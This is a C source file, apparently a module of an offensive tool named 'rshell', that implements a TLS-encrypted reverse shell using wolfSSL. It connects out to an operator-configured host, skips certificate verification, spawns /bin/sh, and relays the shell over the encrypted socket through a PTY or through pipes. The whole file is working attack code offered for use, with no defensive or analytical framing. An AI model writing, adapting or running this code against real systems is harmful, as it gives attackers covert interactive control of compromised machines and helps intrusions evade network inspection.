/*
 * builtin-tls reverse shell using wolfSSL.
 *
 * Connects to the operator tls-shell listener, negotiates TLS, spawns
 * /bin/sh, and relays data between the encrypted socket and the shell.
 * Tries a PTY first for interactive comfort; falls back to pipes.
 */
#define _POSIX_C_SOURCE 200809L
/* grantpt/unlockpt/ptsname are X/Open extensions */
#define _XOPEN_SOURCE 600

#include <errno.h>
#include <fcntl.h>
#include <netdb.h>
#include <poll.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <unistd.h>

#ifdef HAVE_WOLFSSL
#include <wolfssl/ssl.h>

static int tls_tcp_connect(const char *host, const char *port)
{
    struct addrinfo hints, *res, *rp;
    int sock = -1;

    memset(&hints, 0, sizeof(hints));
    hints.ai_family   = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;

    if (getaddrinfo(host, port, &hints, &res) != 0)
        return -1;
    for (rp = res; rp; rp = rp->ai_next) {
        sock = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
        if (sock < 0)
            continue;
        if (connect(sock, rp->ai_addr, rp->ai_addrlen) == 0)
            break;
        close(sock);
        sock = -1;
    }
    freeaddrinfo(res);
    return sock;
}

/* relay_pty: prefer PTY for interactive use, fall back to pipes */
static int relay_pty(WOLFSSL *ssl)
{
    int ptmx = -1;
    char slave_path[64];
    pid_t child;
    int status;
    char buf[4096];
    int n;
    struct pollfd pfd[2];

    /* Attempt to open a PTY master */
    ptmx = posix_openpt(O_RDWR | O_NOCTTY);
    if (ptmx >= 0) {
        char *sname;
        if (grantpt(ptmx) != 0 || unlockpt(ptmx) != 0 ||
            (sname = ptsname(ptmx)) == NULL) {
            close(ptmx);
            ptmx = -1;
        } else {
            snprintf(slave_path, sizeof(slave_path), "%s", sname);
        }
    }

    if (ptmx >= 0) {
        child = fork();
        if (child < 0) {
            close(ptmx);
            return 1;
        }
        if (child == 0) {
            int slave;
            close(ptmx);
            setsid();
            slave = open(slave_path, O_RDWR);
            if (slave < 0)
                _exit(1);
            dup2(slave, 0);
            dup2(slave, 1);
            dup2(slave, 2);
            if (slave > 2)
                close(slave);
            execl("/bin/sh", "sh", NULL);
            _exit(1);
        }

        pfd[0].fd     = ptmx;
        pfd[0].events = POLLIN;
        pfd[1].fd     = wolfSSL_get_fd(ssl);
        pfd[1].events = POLLIN;

        while (1) {
            if (poll(pfd, 2, -1) < 0)
                break;
            if (pfd[0].revents & POLLIN) {
                n = read(ptmx, buf, sizeof(buf));
                if (n <= 0)
                    break;
                if (wolfSSL_write(ssl, buf, n) <= 0)
                    break;
            }
            if (pfd[1].revents & POLLIN) {
                n = wolfSSL_read(ssl, buf, sizeof(buf));
                if (n <= 0)
                    break;
                if (write(ptmx, buf, (size_t)n) < 0)
                    break;
            }
        }
        close(ptmx);
        kill(child, SIGHUP);
        waitpid(child, &status, 0);
        return WIFEXITED(status) ? WEXITSTATUS(status) : 1;
    }

    /* Pipe fallback */
    {
        int in_pipe[2], out_pipe[2];
        pid_t child2;

        if (pipe(in_pipe) != 0 || pipe(out_pipe) != 0)
            return 1;
        child2 = fork();
        if (child2 < 0)
            return 1;
        if (child2 == 0) {
            close(in_pipe[1]);
            close(out_pipe[0]);
            dup2(in_pipe[0], 0);
            dup2(out_pipe[1], 1);
            dup2(out_pipe[1], 2);
            if (in_pipe[0] > 2)
                close(in_pipe[0]);
            if (out_pipe[1] > 2)
                close(out_pipe[1]);
            execl("/bin/sh", "sh", NULL);
            _exit(1);
        }
        close(in_pipe[0]);
        close(out_pipe[1]);

        pfd[0].fd     = out_pipe[0];
        pfd[0].events = POLLIN;
        pfd[1].fd     = wolfSSL_get_fd(ssl);
        pfd[1].events = POLLIN;

        while (1) {
            if (poll(pfd, 2, -1) < 0)
                break;
            if (pfd[0].revents & POLLIN) {
                n = read(out_pipe[0], buf, sizeof(buf));
                if (n <= 0)
                    break;
                if (wolfSSL_write(ssl, buf, n) <= 0)
                    break;
            }
            if (pfd[1].revents & POLLIN) {
                n = wolfSSL_read(ssl, buf, sizeof(buf));
                if (n <= 0)
                    break;
                if (write(in_pipe[1], buf, (size_t)n) < 0)
                    break;
            }
        }
        close(in_pipe[1]);
        close(out_pipe[0]);
        kill(child2, SIGHUP);
        waitpid(child2, &status, 0);
        return WIFEXITED(status) ? WEXITSTATUS(status) : 1;
    }
}

int rshell_builtin_tls(const char *host, const char *port)
{
    WOLFSSL_CTX *ctx;
    WOLFSSL *ssl;
    int sock;
    int rc;

    if (!host || !*host) {
        fputs("rshell: builtin-tls: operator host not configured\n", stderr);
        return 2;
    }

    wolfSSL_Init();
    ctx = wolfSSL_CTX_new(wolfSSLv23_client_method());
    if (!ctx) {
        fputs("rshell: builtin-tls: failed to create wolfSSL context\n", stderr);
        wolfSSL_Cleanup();
        return 1;
    }
    /* Self-signed server cert is the default; matches socat-tls verify=0 behavior */
    wolfSSL_CTX_set_verify(ctx, WOLFSSL_VERIFY_NONE, NULL);

    sock = tls_tcp_connect(host, port);
    if (sock < 0) {
        fprintf(stderr, "rshell: builtin-tls: failed to connect to %s:%s\n", host, port);
        wolfSSL_CTX_free(ctx);
        wolfSSL_Cleanup();
        return 1;
    }

    ssl = wolfSSL_new(ctx);
    if (!ssl) {
        fputs("rshell: builtin-tls: failed to create wolfSSL session\n", stderr);
        close(sock);
        wolfSSL_CTX_free(ctx);
        wolfSSL_Cleanup();
        return 1;
    }
    wolfSSL_set_fd(ssl, sock);

    if (wolfSSL_connect(ssl) != WOLFSSL_SUCCESS) {
        char errbuf[80];
        int err = wolfSSL_get_error(ssl, 0);
        wolfSSL_ERR_error_string(err, errbuf);
        fprintf(stderr, "rshell: builtin-tls: TLS handshake failed: %s\n", errbuf);
        wolfSSL_free(ssl);
        close(sock);
        wolfSSL_CTX_free(ctx);
        wolfSSL_Cleanup();
        return 1;
    }

    rc = relay_pty(ssl);

    wolfSSL_shutdown(ssl);
    wolfSSL_free(ssl);
    close(sock);
    wolfSSL_CTX_free(ctx);
    wolfSSL_Cleanup();
    return rc;
}

#endif /* HAVE_WOLFSSL */
